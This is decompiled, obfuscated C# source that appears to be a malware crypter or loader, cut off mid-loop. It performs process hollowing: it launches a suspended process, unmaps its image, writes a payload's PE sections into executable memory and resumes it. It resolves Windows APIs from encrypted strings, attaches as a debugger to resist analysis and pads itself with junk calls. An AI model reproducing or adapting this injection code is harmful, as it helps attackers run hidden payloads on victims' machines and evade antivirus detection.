using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class4
{
	[CompilerGenerated]
	internal sealed class Class5
	{
		public Class7.Struct0 struct0_0;

		public Class5(Class5 class5_0)
		{
			if (class5_0 != null)
			{
				struct0_0 = class5_0.struct0_0;
			}
		}
	}

	[CompilerGenerated]
	internal sealed class Class6
	{
		public int int_0;

		public int int_1;

		public Class5 class5_0;

		public Class6(Class6 class6_0)
		{
			if (class6_0 != null)
			{
				int_0 = class6_0.int_0;
				int_1 = class6_0.int_1;
			}
		}

		[SpecialName]
		internal void method_0()
		{
			Thread.CurrentThread.IsBackground = true;
			smethod_1(class5_0.struct0_0, checked((uint)int_0), int_1);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	private static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(Class7.GetProcAddress(LoadLibraryA(ref string_0), string_1), typeof(T));
	}

	private unsafe static void smethod_1(Class7.Struct0 struct0_0, uint uint_0, int int_0)
	{
		void* ptr = stackalloc byte[33];
		Class7.Delegate9 @delegate = smethod_0<Class7.Delegate9>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("BBrz7k9/VHyH4NYARbZoNcwrJSFNQpc2Vpa34b/7NH8="));
		Class7.Delegate10 delegate2 = smethod_0<Class7.Delegate10>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("g17v8APK2aA7oLiK5sGzPK5YE7lVRdAKohXm6pj4TXk="));
		Class7.Delegate11 delegate3 = smethod_0<Class7.Delegate11>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("iqr3bTp09K/ClB7FIiJEi7JsyD1cjBwsJZLZ5NHivug="));
		Class7.Delegate12 delegate4 = smethod_0<Class7.Delegate12>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("OFcq0jBAUv+QlzgJTacGl55Vbuu1anHhRYaXp46qSIo="));
		Class7.Delegate0 delegate5 = smethod_0<Class7.Delegate0>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("RNNMRu9HpEqLoIAnm2jZ5SJtRhR2o+mnWYaTGHfEC/A="));
		Class7.Delegate8 delegate6 = smethod_0<Class7.Delegate8>(Class9.smethod_0("eDAECoHuT4guqKSvOGp4yg=="), Class9.smethod_0("iy1ljydF6nv9OhRn+++0LQ=="));
		((byte*)ptr)[9] = 0;
		((byte*)ptr)[10] = ((!@delegate(checked((int)struct0_0.uint_0))) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[10] != 0)
		{
			((byte*)ptr)[11] = 0;
			throw new Exception();
		}
		delegate3(KillOnExit: false);
		*(int*)ptr = 64;
		((byte*)ptr)[8] = 1;
		object obj = default(object);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			((byte*)ptr)[28] = ((byte*)ptr)[8];
			if (((byte*)ptr)[28] != 0)
			{
				Class7.Struct2 lpDebugEvent = default(Class7.Struct2);
				((byte*)ptr)[13] = ((!delegate2(out lpDebugEvent, -1)) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[13] != 0)
				{
					break;
				}
				string string_;
				switch (lpDebugEvent.enum0_0)
				{
				case Class7.Enum0.const_7:
					((byte*)ptr)[14] = ((lpDebugEvent.method_0().struct3_0.uint_0 == 2147483649u) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[14] != 0)
					{
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						((byte*)ptr)[15] = ((!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref *(uint*)ptr)) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[15] == 0)
						{
						}
						break;
					}
					Thread.Sleep(400);
					delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
					goto IL_030c;
				case Class7.Enum0.const_3:
					((byte*)ptr)[16] = 0;
					try
					{
						((byte*)ptr)[17] = ((!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref *(uint*)ptr)) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[17] != 0)
						{
							((byte*)ptr)[18] = 0;
						}
						Thread.Sleep(400);
						((byte*)ptr)[19] = ((!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref *(uint*)ptr)) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[19] != 0)
						{
							((byte*)ptr)[20] = 0;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						Thread.Sleep(400);
						((byte*)ptr)[21] = ((!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref *(uint*)ptr)) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[21] != 0)
						{
							((byte*)ptr)[22] = 0;
						}
						((byte*)ptr)[23] = ((!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref *(uint*)ptr)) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[23] == 0)
						{
						}
						ProjectData.ClearProjectError();
					}
					((byte*)ptr)[24] = 0;
					*(int*)((byte*)ptr + 4) = 0;
					((byte*)ptr)[25] = ((delegate6(struct0_0.intptr_1, out *(uint*)((byte*)ptr + 4)) == -1) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[25] == 0)
					{
						((byte*)ptr)[26] = 0;
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_030c;
					}
					throw new Exception("f");
				default:
					delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
					goto IL_030c;
				case Class7.Enum0.const_8:
					{
						((byte*)ptr)[8] = 0;
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
						goto IL_030c;
					}
					IL_030c:
					GC.Collect();
					string_ = "d";
					DhcpDeRegisterParamChange(1343, ref string_);
					((byte*)ptr)[27] = 0;
					break;
				}
				continue;
			}
			try
			{
				((byte*)ptr)[29] = 0;
				StringBuilder stringBuilder = new StringBuilder();
				try
				{
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Replace", new object[2] { "'", "\\'" }, (string[])null, (Type[])null, (bool[])null));
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Replace", new object[2] { '"', "\\\"" }, (string[])null, (Type[])null, (bool[])null));
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Replace", new object[2] { "\r\n", "\\n" }, (string[])null, (Type[])null, (bool[])null));
					obj = Operators.ConcatenateObject(Operators.ConcatenateObject((object)"<script language='javascript'>alert('", obj), (object)"');</script>");
					stringBuilder = new StringBuilder();
					stringBuilder.Append(RuntimeHelpers.GetObjectValue(obj));
					object obj2 = null;
					try
					{
						enumerator = ((IEnumerable)NewLateBinding.LateGet(obj2, (Type)null, "Controls", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (true)
						{
							((byte*)ptr)[31] = (enumerator.MoveNext() ? ((byte)1) : ((byte)0));
							if (((byte*)ptr)[31] != 0)
							{
								Conversions.ToString(enumerator.Current);
								((byte*)ptr)[30] = 0;
								continue;
							}
							break;
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				Process.GetProcessById(checked((int)struct0_0.uint_0)).Kill();
				new Class8();
				Process.GetCurrentProcess().Kill();
				((byte*)ptr)[32] = 0;
				((byte*)ptr)[12] = 1;
				d(15324234L, 21452142152132L, ref *(bool*)((byte*)ptr + 12));
				return;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return;
			}
		}
		throw new Exception();
	}

	public unsafe static bool smethod_2(object[] object_0)
	{
		void* ptr = stackalloc byte[6];
		*(int*)ptr = 1;
		while (true)
		{
			((byte*)ptr)[5] = (smethod_3(object_0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[5] == 0)
			{
				checked
				{
					(*unchecked((int*)ptr))++;
				}
				if (*(int*)ptr > 7)
				{
					((byte*)ptr)[4] = 0;
					break;
				}
				continue;
			}
			((byte*)ptr)[4] = 1;
			break;
		}
		return ((byte*)ptr)[4] != 0;
	}

	private unsafe static bool smethod_3(object[] object_0)
	{
		void* ptr = stackalloc byte[4501];
		Class5 class5_ = new Class5(class5_);
		Class7.Delegate1 @delegate = smethod_0<Class7.Delegate1>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("kVdWt2m955ig9LvIKqBJ7Q=="));
		Class7.Delegate2 delegate2 = smethod_0<Class7.Delegate2>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("M+Cx1wPRkCQPwhR5g7XQekaqAMuhh60oEKoaAbNvuIk="));
		Class7.Delegate3 delegate3 = smethod_0<Class7.Delegate3>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("OCVByD5Kb4dymngcmPozmijexOC14Oik/RQZbeXPCDo="));
		Class7.Delegate4 delegate4 = smethod_0<Class7.Delegate4>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("FjiFXnN7CBcQa33vgPA3BS5YktkkXqZt0GLjZJiitb8="));
		Class7.Delegate5 delegate5 = smethod_0<Class7.Delegate5>(Class9.smethod_0("eDAECoHuT4guqKSvOGp4yg=="), Class9.smethod_0("e4WJnVJ/R9vGiA+MBU/59/rUjihz+FgywIBB0+3YkVw="));
		Class7.Delegate6 delegate6 = smethod_0<Class7.Delegate6>(Class9.smethod_0("eDAECoHuT4guqKSvOGp4yg=="), Class9.smethod_0("oKL4yaE9EBm/y9S+kqvCkaq4w3M21Bt7/g7gAFxXVD4="));
		Class7.Delegate7 delegate7 = smethod_0<Class7.Delegate7>(Class9.smethod_0("uzbZJOXM1ti/o9VzPqHexQ=="), Class9.smethod_0("BGwD0JvCcYuc0GAsN3P9tw=="));
		Class7.Delegate8 delegate8 = smethod_0<Class7.Delegate8>(Class9.smethod_0("eDAECoHuT4guqKSvOGp4yg=="), Class9.smethod_0("iy1ljydF6nv9OhRn+++0LQ=="));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		((byte*)ptr)[3599] = (((bool)object_0[2]) ? ((byte)1) : ((byte)0));
		((byte*)ptr)[3600] = (((bool)object_0[3]) ? ((byte)1) : ((byte)0));
		string text2 = (string)object_0[4];
		*(int*)ptr = (int)object_0[5];
		*(int*)((byte*)ptr + 4) = checked(*unchecked((int*)ptr) + 5424);
		*(int*)((byte*)ptr + 8) = 0;
		string text3 = $"\"{text2}\"";
		Class7.Struct1 struct1_ = default(Class7.Struct1);
		class5_.struct0_0 = default(Class7.Struct0);
		struct1_.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class7.Struct1)));
		try
		{
			Class6 class6_ = default(Class6);
			Class6 CS_0024_003C_003E8__locals0 = new Class6(class6_);
			CS_0024_003C_003E8__locals0.class5_0 = class5_;
			((byte*)ptr)[3602] = ((!string.IsNullOrEmpty(text)) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3602] != 0)
			{
				text3 = text3 + " " + text;
			}
			((byte*)ptr)[3603] = ((!@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, bool_0: false, 4u, IntPtr.Zero, null, ref struct1_, ref CS_0024_003C_003E8__locals0.class5_0.struct0_0)) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3603] != 0)
			{
				throw new Exception();
			}
			*(int*)((byte*)ptr + 12) = BitConverter.ToInt32(array, 60);
			*(int*)((byte*)ptr + 16) = BitConverter.ToInt32(array, checked(*unchecked((int*)((byte*)ptr + 12)) + 52));
			int[] array2 = new int[179];
			array2[0] = 65538;
			((byte*)ptr)[3604] = ((!delegate4(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_1, array2)) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3604] != 0)
			{
				throw new Exception();
			}
			*(int*)((byte*)ptr + 20) = array2[41];
			*(int*)((byte*)ptr + 24) = 0;
			((byte*)ptr)[3605] = ((!delegate2(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(*unchecked((int*)((byte*)ptr + 20)) + 8), ref *(int*)((byte*)ptr + 24), 4, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3605] != 0)
			{
				throw new Exception();
			}
			((byte*)ptr)[3606] = ((*(int*)((byte*)ptr + 16) == *(int*)((byte*)ptr + 24)) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3606] != 0)
			{
				((byte*)ptr)[3607] = ((delegate6(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, *(int*)((byte*)ptr + 24)) != 0) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[3607] != 0)
				{
					throw new Exception();
				}
			}
			checked
			{
				*unchecked((int*)((byte*)ptr + 28)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 12)) + 80);
				CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 12)) + 84);
			}
			((byte*)ptr)[3601] = 0;
			CS_0024_003C_003E8__locals0.int_0 = delegate7(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, *(int*)((byte*)ptr + 16), *(int*)((byte*)ptr + 28), 12288, 64);
			if (((byte*)ptr)[3599] == 0 && CS_0024_003C_003E8__locals0.int_0 == 0)
			{
				((byte*)ptr)[3601] = 1;
				CS_0024_003C_003E8__locals0.int_0 = delegate7(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, 0, *(int*)((byte*)ptr + 28), 12288, 64);
			}
			((byte*)ptr)[3608] = ((CS_0024_003C_003E8__locals0.int_0 == 0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3608] != 0)
			{
				throw new Exception();
			}
			((byte*)ptr)[3609] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[3609] != 0)
			{
				throw new Exception();
			}
			checked
			{
				*unchecked((int*)((byte*)ptr + 32)) = *unchecked((int*)((byte*)ptr + 12)) + 248;
				*unchecked((short*)((byte*)ptr + 3596)) = BitConverter.ToInt16(array, *unchecked((int*)((byte*)ptr + 12)) + 6);
			}
			*(int*)((byte*)ptr + 36) = 0;
			while (true)
			{
				((byte*)ptr)[3612] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[3612] == 0)
				{
					break;
				}
				checked
				{
					*unchecked((int*)((byte*)ptr + 48)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
					*unchecked((int*)((byte*)ptr + 52)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
					*unchecked((int*)((byte*)ptr + 56)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
				}
				((byte*)ptr)[3610] = ((*(int*)((byte*)ptr + 52) != 0) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[3610] != 0)
				{
					byte[] array3;
					checked
					{
						array3 = new byte[*unchecked((int*)((byte*)ptr + 52)) - 1 + 1];
					}
					Buffer.BlockCopy(array, *(int*)((byte*)ptr + 56), array3, 0, array3.Length);
					((byte*)ptr)[3611] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 48))), array3, array3.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3611] != 0)
					{
						throw new Exception();
					}
				}
				checked
				{
					*unchecked((int*)((byte*)ptr + 32)) += 40;
					(*unchecked((int*)((byte*)ptr + 36)))++;
				}
			}
			*(int*)((byte*)ptr + 40) = 32;
			while (true)
			{
				((byte*)ptr)[4495] = ((*(int*)((byte*)ptr + 40) < 27) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4495] == 0)
				{
					break;
				}
				while (true)
				{
					((byte*)ptr)[3615] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3615] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 60)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 64)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 68)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3613] = ((*(int*)((byte*)ptr + 64) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3613] != 0)
					{
						byte[] array4;
						checked
						{
							array4 = new byte[*unchecked((int*)((byte*)ptr + 64)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 68), array4, 0, array4.Length);
						((byte*)ptr)[3614] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 60))), array4, array4.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3614] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3618] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3618] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 72)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 76)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 80)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3616] = ((*(int*)((byte*)ptr + 76) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3616] != 0)
					{
						byte[] array5;
						checked
						{
							array5 = new byte[*unchecked((int*)((byte*)ptr + 76)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 80), array5, 0, array5.Length);
						((byte*)ptr)[3617] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 72))), array5, array5.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3617] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3621] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3621] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 84)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 88)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 92)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3619] = ((*(int*)((byte*)ptr + 88) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3619] != 0)
					{
						byte[] array6;
						checked
						{
							array6 = new byte[*unchecked((int*)((byte*)ptr + 88)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 92), array6, 0, array6.Length);
						((byte*)ptr)[3620] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 84))), array6, array6.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3620] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3624] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3624] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 96)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 100)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 104)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3622] = ((*(int*)((byte*)ptr + 100) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3622] != 0)
					{
						byte[] array7;
						checked
						{
							array7 = new byte[*unchecked((int*)((byte*)ptr + 100)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 104), array7, 0, array7.Length);
						((byte*)ptr)[3623] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 96))), array7, array7.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3623] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3627] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3627] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 108)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 112)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 116)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3625] = ((*(int*)((byte*)ptr + 112) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3625] != 0)
					{
						byte[] array8;
						checked
						{
							array8 = new byte[*unchecked((int*)((byte*)ptr + 112)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 116), array8, 0, array8.Length);
						((byte*)ptr)[3626] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 108))), array8, array8.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3626] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3630] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3630] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 120)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 124)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 128)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3628] = ((*(int*)((byte*)ptr + 124) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3628] != 0)
					{
						byte[] array9;
						checked
						{
							array9 = new byte[*unchecked((int*)((byte*)ptr + 124)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 128), array9, 0, array9.Length);
						((byte*)ptr)[3629] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 120))), array9, array9.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3629] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3633] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3633] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 132)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 136)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 140)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3631] = ((*(int*)((byte*)ptr + 136) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3631] != 0)
					{
						byte[] array10;
						checked
						{
							array10 = new byte[*unchecked((int*)((byte*)ptr + 136)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 140), array10, 0, array10.Length);
						((byte*)ptr)[3632] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 132))), array10, array10.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3632] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3636] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3636] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 144)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 148)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 152)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3634] = ((*(int*)((byte*)ptr + 148) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3634] != 0)
					{
						byte[] array11;
						checked
						{
							array11 = new byte[*unchecked((int*)((byte*)ptr + 148)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 152), array11, 0, array11.Length);
						((byte*)ptr)[3635] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 144))), array11, array11.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3635] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3639] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3639] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 156)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 160)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 164)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
